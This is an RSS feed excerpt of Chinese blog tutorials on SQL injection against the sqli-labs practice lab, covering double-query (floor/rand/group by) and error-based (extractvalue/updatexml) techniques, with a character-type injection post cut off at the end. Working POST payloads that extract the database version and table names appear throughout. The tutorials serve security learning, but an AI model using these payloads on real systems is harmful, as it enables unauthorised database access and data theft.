            <link>https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%8F%8C%E6%B3%A8%E5%85%A5/</link>
            <category>SQL注入探究</category>
            <pubDate>Sat, 01 Oct 2022 00:08:18 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;sql-注入之双注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sql-注入之双注入&#34;&gt;#&lt;/a&gt; SQL 注入之双注入&lt;/h1&gt;
&lt;p&gt;本篇使用双注入。&lt;/p&gt;
&lt;h2 id=&#34;注入步骤&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#注入步骤&#34;&gt;#&lt;/a&gt; 注入步骤&lt;/h2&gt;
&lt;h3 id=&#34;设置代理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#设置代理&#34;&gt;#&lt;/a&gt; 设置代理&lt;/h3&gt;
&lt;p&gt;还是 Less-11，我们挂上&lt;strong&gt; BurpSuit&lt;/strong&gt; 代理，然后&lt;strong&gt; Send To Reapeater&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220930220638714.png&#34; alt=&#34;image-20220930220638714&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;确定注入类型和列数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确定注入类型和列数&#34;&gt;#&lt;/a&gt; 确定注入类型和列数&lt;/h3&gt;
&lt;p&gt;我们输入 1 + 单引号。 &lt;strong&gt;不报错&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=1&amp;#x27; %23&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220930221056886.png&#34; alt=&#34;image-20220930221056886&#34;&gt;&lt;/p&gt;
&lt;p&gt;输入 1 + 单引号 + %23&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=1&amp;#x27;&amp;quot; %23&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;报错， &lt;code&gt;&amp;quot; #&#39; and password=&#39;123456&#39; LIMIT 0,1&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;由 #号后面跟着个单引号，这就说明第一个&lt;strong&gt; username 是使用单引号闭合的&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220930221013645.png&#34; alt=&#34;image-20220930221013645&#34;&gt;&lt;/p&gt;
&lt;p&gt;使用 order by n 确定列数&lt;/p&gt;
&lt;p&gt;输入 2，不报错&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=1&amp;#x27; order by 2 %23&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220930221434509.png&#34; alt=&#34;image-20220930221434509&#34;&gt;&lt;/p&gt;
&lt;p&gt;输入 3，报错&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=1&amp;#x27; order by 3 %23&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220930221557671.png&#34; alt=&#34;image-20220930221557671&#34;&gt;&lt;/p&gt;
&lt;p&gt;综上，注入类型是&lt;strong&gt; POST 型单引号注入&lt;/strong&gt;，且&lt;strong&gt;查询列数为 2&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;采用双注入时，我们需要使用到以下函数：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;group by 函数：在对数据进行分组时会先看虚拟表中是否存在这个值，不存在就插入；&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;floor()函数：MySQL的一个数学函数。此函数用于查找等于或小于给定数字的最大整数。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Select floor(11.2); ----&amp;gt;返回11（注意，只返回11，因为11是小于11.2的最大整数）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+----------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|   floor(11.2)  |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+----------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|           11   |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+----------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rand()函数：获取随机的浮点数（小于0的小数），而 rand(0) 则是获取固定的小数值&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;举例说明：select rand() from qs_ad_category;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;结果为随机的浮点型小数：0.7450851357961866&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;floor() 函数 配合 rand() 函数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;由于rand()函数是获取小于1 的浮点数，也就是例如上述结果中的0.7450851357961866&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;而floor()函数是将括号中的值取整，以小于括号中值的最大整数作为结果展示出来。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;例如上述rand()的结果为 0.7450851357961866，那么最大整数就是 “0” 所以 ：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select floor(rand(0)) from qs_ad_category 的 结果值 为 “0” 。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;若是rand()*2,则 rand() 结果可能会大于 1 ，那么结合 floor()函数 ——最终的值可能为0，可能为1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;count() 函数：计数函数，用来计算数据总和的函数，该函数结果集只有一个。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;count(1)：统计不为NULL 的记录。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;count(*)：统计所有的记录（包括NULL）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;count(字段)：统计该&amp;quot;字段&amp;quot;不为NULL 的记录。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;count(DISTINCT 字段)：统计该&amp;quot;字段&amp;quot;去重且不为NULL 的记录。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;如果三者一起使用:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select 1,count(1) from information_schema.tables group by floor(rand(0)*2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;意思是，floor(rand(0)*2)这个值存在的话 count()加1，若虛表不存在记录，插入虚表时会把floor(rand(0)*2)再执行一次（注意是一次，很重要！！！）&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;使用 group by floor (rand () *2)&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=1&amp;#x27; union select 1,2 from information_schema.tables group by floor(rand()*2) %23&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220930223216903.png&#34; alt=&#34;image-20220930223216903&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以看到，uname 和 password 位都被 select 的内容（1 和 2）代替。&lt;/p&gt;
&lt;p&gt;下面探究 group by、rand ()、count () 的组合使用的关系。&lt;/p&gt;
&lt;h3 id=&#34;灵魂拷问一rand和rand0有什么区别&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#灵魂拷问一rand和rand0有什么区别&#34;&gt;#&lt;/a&gt; 灵魂拷问一：rand () 和 rand (0) 有什么区别？&lt;/h3&gt;
&lt;p&gt;使用 &lt;code&gt;rand() *2&lt;/code&gt; ， &lt;code&gt;第一次&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220930225234750.png&#34; alt=&#34;image-20220930225234750&#34;&gt;&lt;/p&gt;
&lt;p&gt;使用 &lt;code&gt;rand() *2&lt;/code&gt; ， &lt;code&gt;第二次&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220930225215910.png&#34; alt=&#34;image-20220930225215910&#34;&gt;&lt;/p&gt;
&lt;p&gt;使用 &lt;code&gt;rand() *2&lt;/code&gt; ， &lt;code&gt;第三次&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220930225250214.png&#34; alt=&#34;image-20220930225250214&#34;&gt;&lt;/p&gt;
&lt;p&gt;综合以上三次使用 rand ()*2 的情况，我们发现结果毫无规律，是真正的随机。&lt;/p&gt;
&lt;p&gt;使用 &lt;code&gt;rand(0) *2&lt;/code&gt; ， &lt;code&gt;第一次&lt;/code&gt; 、 &lt;code&gt;第二次&lt;/code&gt; 、 &lt;code&gt;第三次&lt;/code&gt; 都是下图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220930225429894.png&#34; alt=&#34;image-20220930225429894&#34;&gt;&lt;/p&gt;
&lt;p&gt;结果说明，使用 rand (0)*2 可以做到一种伪随机变化，会一直保持 011 011 011 这样的规律。&lt;/p&gt;
&lt;h3 id=&#34;灵魂拷问二为什么select-1-count1-from-xxx-group-by-floorrand0-2-会报错&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#灵魂拷问二为什么select-1-count1-from-xxx-group-by-floorrand0-2-会报错&#34;&gt;#&lt;/a&gt; 灵魂拷问二：为什么 select 1, count (1) from xxx group by floor (rand (0) * 2) 会报错？&lt;/h3&gt;
&lt;p&gt;我们需要知道先创建虚拟表，以下图 (其中 key 是 group by 后面跟随的内容【即主键】，不可重复)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220930230206868.png&#34; alt=&#34;image-20220930230206868&#34;&gt;&lt;/p&gt;
&lt;p&gt;开始查询数据，取数据库数据，而后查看虚拟表中是否存在主键，不存在则插入新记录，存在则 count (1) 字段直接加 1，&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220930230334615.png&#34; alt=&#34;image-20220930230334615&#34;&gt;&lt;/p&gt;
&lt;p&gt;由此看到 若是 key 存在的话就 + 1， 不存在的话就新建一个 key。&lt;/p&gt;
&lt;p&gt;但是 mysql 官方有给提示，查询的时候若是使用了 rand () 的话，该值会被计算屡次，这个【计算屡次】是什么意思？就是在使用 group by 的时候，floor (rand (0)*2) 会被执行一次，若是虚表不存在这个记录，插入虚表的时候会再被执行一次。&lt;/p&gt;
&lt;p&gt;由前文可知，floor (rand (0)*2) 的值是 011011011… 的规律。&lt;/p&gt;
&lt;p&gt;取第一条记录，取到的值是 0【 &lt;code&gt;第一次计算&lt;/code&gt; 】。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;判断&lt;/code&gt; ：虚表中发现 0 这个键值并不存在，那么，floor (rand (0)*2) 会被再次计算一次&lt;/p&gt;
&lt;p&gt;结果取到了 1【 &lt;code&gt;第二次计算&lt;/code&gt; 】。将 key=1 插入虚表，这是第一条记录查询完毕。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220930231052670.png&#34; alt=&#34;image-20220930231052670&#34;&gt;&lt;/p&gt;
&lt;p&gt;查询第二次记录，再次计算 floor (rand (0)*2)，发现结果为 1【 &lt;code&gt;第三次计算&lt;/code&gt; 】。&lt;/p&gt;
&lt;p&gt;查询虚表，发现 1 这个键值已经存在，因此 floor (rand (0)*2) 不会再次计算，直接 count (1) 加 1，第二条记录查询完毕。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220930231458853.png&#34; alt=&#34;image-20220930231458853&#34;&gt;&lt;/p&gt;
&lt;p&gt;查询第三条记录，再次计算 floor (rand (0)*2)，取值为 0【 &lt;code&gt;第四次计算&lt;/code&gt; 】，查询虚表，发现键值没有 0，则再次计算 floor，取值为 1【 &lt;code&gt;第五次计算&lt;/code&gt; 】&lt;/p&gt;
&lt;p&gt;而此时，1 这个主键已经存在于虚表中，新计算的值也为 1【 &lt;code&gt;第五次计算&lt;/code&gt; 】，&lt;strong&gt;由于插入的 key 主键值必须唯一&lt;/strong&gt;，新计算的 1 和主键 1 重复，因此插入的时候直接报错。&lt;/p&gt;
&lt;h3 id=&#34;灵魂拷问三选择rand0而非rand的原因&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#灵魂拷问三选择rand0而非rand的原因&#34;&gt;#&lt;/a&gt; 灵魂拷问三：选择 rand (0) 而非 rand () 的原因&lt;/h3&gt;
&lt;p&gt;简而言之，group by 插入进 &amp;lt;key，count (1)&amp;gt; 虚表的前提是 —— &lt;code&gt;当前的记录在虚表中不存在&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;白话文解释：当前的记录由于 011011011 这特殊规律导致 0 这个记录的在表中不存在，计算时总是被取值成 1 插入虚表，第一次还能插进来，但在第二次新插入进来的 1 又存在于虚表中，所以就报 “重复条目 “的错了。&lt;/p&gt;
&lt;p&gt;选择 &lt;code&gt;rand(0)x2&lt;/code&gt;  是&lt;strong&gt;必会报错&lt;/strong&gt;，而 &lt;code&gt;rand()x2&lt;/code&gt;  就不一定了【可能报错、可能不报错】。&lt;/p&gt;
&lt;p&gt;因为通过上文解释，如果不是 011011 这个特殊规律，0 和 1 是都可以进到虚表中，如果都能进来，那就不会报错。&lt;/p&gt;
&lt;p&gt;因此，100% 报错须要 count ()，rand (0)*2、group by，三者缺一不可。&lt;/p&gt;
&lt;h3 id=&#34;双注入走起&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#双注入走起&#34;&gt;#&lt;/a&gt; 双注入走起&lt;/h3&gt;
&lt;p&gt;首先使用 concat 组合字符串&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=1&amp;#x27; union select 1,count(1) from information_schema.tables group by concat(floor(rand(0)*2), version()) %23&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001000024436.png&#34; alt=&#34;image-20221001000024436&#34;&gt;&lt;/p&gt;
&lt;p&gt;将 version 处替换成我们想要的 select 语句【注意，这里只能使用 limit 0,1 来进行输出爆破，group_concat 会爆出数据库信息失败】&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=1&amp;#x27; union select 1,count(1) from information_schema.tables group by concat(floor(rand(0)*2), (select table_name from information_schema.tables where table_schema=database() limit 0,1)) %23&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001000515293.png&#34; alt=&#34;image-20221001000515293&#34;&gt;&lt;/p&gt;
&lt;p&gt;至此，双注入演示完毕。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</guid>
            <title>报错注入</title>
            <link>https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</link>
            <category>SQL注入探究</category>
            <pubDate>Thu, 29 Sep 2022 23:57:38 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;sql-注入之报错注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sql-注入之报错注入&#34;&gt;#&lt;/a&gt; SQL 注入之报错注入&lt;/h1&gt;
&lt;p&gt;本篇使用报错注入。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;注意&lt;/code&gt; ：报错函数的使用中，第二个参数如果来自于查询语句，都是&lt;strong&gt;需要用小括号包裹起来的&lt;/strong&gt;。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#使用 extractvalue(1, (select xxx))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;uname=1&amp;#x27; union select 1, extractvalue(1, concat(&amp;#x27;%&amp;#x27;, (select table_name from information_schema.tables where table_schema=database()))) --+&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#使用 updatexml(1, (select xxx), 1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;uname=1&amp;#x27; union select 1, updatexml(1, concat(&amp;#x27;%&amp;#x27;, (select group_concat(table_name) from information_schema.tables where table_schema=database())),1) --+&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;注入步骤&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#注入步骤&#34;&gt;#&lt;/a&gt; 注入步骤&lt;/h2&gt;
&lt;h3 id=&#34;设置代理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#设置代理&#34;&gt;#&lt;/a&gt; 设置代理&lt;/h3&gt;
&lt;p&gt;还是 Less-11，我们挂上&lt;strong&gt; BurpSuit&lt;/strong&gt; 代理，然后&lt;strong&gt; Send To Reapeater&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929231322659.png&#34; alt=&#34;image-20220929231322659&#34;&gt;&lt;/p&gt;
&lt;p&gt;报错注入常使用的函数如下：&lt;/p&gt;
&lt;p&gt;①&lt;strong&gt;extractvalue&lt;/strong&gt; (): 从目标 XML 中返回包含所查询值的字符串。&lt;/p&gt;
&lt;p&gt;例子：extractvalue (XML_document, XPath_string);&lt;/p&gt;
&lt;p&gt;&lt;code&gt;第一个参数&lt;/code&gt; ：XML_documentshi String 格式，为 XML 文档对象的名称。&lt;strong&gt;在报错注入中可以随意指定，比如 1 即可。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;第二个参数&lt;/code&gt; ：XPath_string (Xpath 格式的字符串)。&lt;strong&gt;在报错注入中由于就是利用这个点来泄露信息，所以重点构造语句放在这个第二个参数里。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;concat ()：返回结果为连接参数产生的字符串。&lt;/p&gt;
&lt;p&gt;②&lt;strong&gt;updatexml&lt;/strong&gt; (): 更新 XML 信息&lt;/p&gt;
&lt;p&gt;例子：updatexml (XML_document, XPath_string, new_value);&lt;/p&gt;
&lt;p&gt;&lt;code&gt;第一个参数&lt;/code&gt; ：XML_document 是 String 格式，为 XML 文档对象的名称。&lt;strong&gt;在报错注入中可以随意指定，比如 1 即可。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;第二个参数&lt;/code&gt; ：XPath_string (XPATH 格式的字符串)。&lt;strong&gt;在报错注入中由于就是利用这个点来泄露信息，所以重点构造语句放在这个第二个参数里。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;第三个参数&lt;/code&gt; ：new_value, String 格式， 替换查找到的符合条件的数据。&lt;strong&gt;在报错注入中可以随意指定，比如 1 即可。&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;确定注入类型和列数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确定注入类型和列数&#34;&gt;#&lt;/a&gt; 确定注入类型和列数&lt;/h3&gt;
&lt;p&gt;通过单引号注入和 order by n 来&lt;strong&gt;确定注入类型&lt;/strong&gt;和&lt;strong&gt;查询列数&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929232026560.png&#34; alt=&#34;image-20220929232026560&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;使用指定报错函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#使用指定报错函数&#34;&gt;#&lt;/a&gt; 使用指定报错函数&lt;/h3&gt;
&lt;p&gt;那么我们就可构造：&lt;/p&gt;
&lt;p&gt;extractvalue (1, XPATH_string)，其中 XPATH_string 为 (select version ())&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=1&amp;#x27; union select 1, extractvalue(1, (select version())) --+&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929233031785.png&#34; alt=&#34;image-20220929233031785&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以看到版本号被截断，信息不全。我们尝试调 concat () 函数使用 0x7e 字符拼接：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=1&amp;#x27; union select 1, extractvalue(1, concat(0x7e, (select version()))) --+&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929233343167.png&#34; alt=&#34;image-20220929233343167&#34;&gt;&lt;/p&gt;
&lt;p&gt;这里分割字符串可以换成 %，分割字符串的选择比较看运气，有时候后台会校验，所以多用 ASCII 来表示。&lt;strong&gt;比如波浪线的 ASCII 为 0x7e&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929233647634.png&#34; alt=&#34;image-20220929233647634&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;泄露数据库信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#泄露数据库信息&#34;&gt;#&lt;/a&gt; 泄露数据库信息&lt;/h3&gt;
&lt;p&gt;准备泄露数据库的表名&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=1&amp;#x27; union select 1, extractvalue(1, concat(&amp;#x27;%&amp;#x27;, (select table_name from information_schema.tables where table_schema=database()))) --+&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;但是报了错， &lt;code&gt;Subquery returns more than 1 row&lt;/code&gt; ，说明最后查询的 select 的列数超过了一列。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929233914430.png&#34; alt=&#34;image-20220929233914430&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们需要&lt;strong&gt;使用 limit 0,1 限制一列输出&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929234118900.png&#34; alt=&#34;image-20220929234118900&#34;&gt;&lt;/p&gt;
&lt;p&gt;或者&lt;strong&gt;使用 group_concat 拼接成一列&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929234238245.png&#34; alt=&#34;image-20220929234238245&#34;&gt;&lt;/p&gt;
&lt;p&gt;同理，也使用 updatexml 进行报错注入&lt;/p&gt;
&lt;p&gt;构造时，因为我们关键是为了调用 &lt;code&gt;updatexml&lt;/code&gt;  函数和使用 &lt;code&gt;第二个参数&lt;/code&gt; 进行内容输出，因此&lt;strong&gt;第一个参数&lt;/strong&gt;和&lt;strong&gt;第三个参数&lt;/strong&gt;都是 **“无用”** 的，设置成 1 即可。&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; union select 1, updatexml(1, concat(&amp;#x27;&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;, (select group_concat(table_name) from information_schema.tables where table_schema=database())),1) --+&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929234443551.png&#34; alt=&#34;image-20220929234443551&#34;&gt;&lt;/p&gt;
&lt;p&gt;至此，报错注入演示完毕。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5/</guid>
            <title>字符型注入</title>
            <link>https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5/</link>
            <category>SQL注入探究</category>
            <pubDate>Thu, 29 Sep 2022 21:54:18 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;sql-注入之字符型注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sql-注入之字符型注入&#34;&gt;#&lt;/a&gt; SQL 注入之字符型注入&lt;/h1&gt;
&lt;p&gt;本篇使用字符型注入。&lt;/p&gt;
&lt;h2 id=&#34;注入步骤单引号注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#注入步骤单引号注入&#34;&gt;#&lt;/a&gt; 注入步骤 (单引号注入)&lt;/h2&gt;
&lt;p&gt;由于 Less-1 从请求上看到是 GET 型，所以礼节性地输入个 id=1&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929215708949.png&#34; alt=&#34;image-20220929215708949&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;尝试注入类型&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#尝试注入类型&#34;&gt;#&lt;/a&gt; 尝试注入类型&lt;/h3&gt;
&lt;p&gt;输入 1’  来看看是否报错&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929215814839.png&#34; alt=&#34;image-20220929215814839&#34;&gt;&lt;/p&gt;
&lt;p&gt;输入 22’  来看看是否报错&lt;/p&gt;
